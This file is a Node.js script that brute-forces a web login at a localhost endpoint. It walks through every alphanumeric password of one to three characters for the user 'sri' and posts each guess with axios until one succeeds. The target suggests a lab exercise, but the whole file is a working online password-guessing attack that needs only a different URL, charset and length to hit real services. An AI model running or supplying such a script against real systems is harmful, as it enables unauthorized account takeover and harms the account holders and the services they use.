const axios = require('axios');

// Config
const LOGIN_URL = 'http://localhost:3000/login';
const USERNAME = 'sri';
const CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
const MAX_PASSWORD_LENGTH = 3; // Try from 1 to 3 characters

// Recursive generator to yield all combinations up to a certain length
function* generatePasswords(charset, maxLength, current = '') {
  if (current.length > 0) yield current;
  if (current.length === maxLength) return;

  for (let char of charset) {
    yield* generatePasswords(charset, maxLength, current + char);
  }
}

// Try login with given password
async function attemptLogin(username, password) {
  try {
    const response = await axios.post(LOGIN_URL, {
      username: username,
      password: password
    });

    if (response.data && response.data.success) {
      console.log(`✅ Password found: ${password}`);
      return true;
    }
  } catch (error) {
    // Ignore 401 or 500 etc.
  }
  return false;
}

// Brute-force loop
async function bruteForce() {
  for (let password of generatePasswords(CHARSET, MAX_PASSWORD_LENGTH)) {
    console.log(`🔍 Trying password: ${password}`);
    const found = await attemptLogin(USERNAME, password);
    if (found) break;
  }
}

bruteForce();
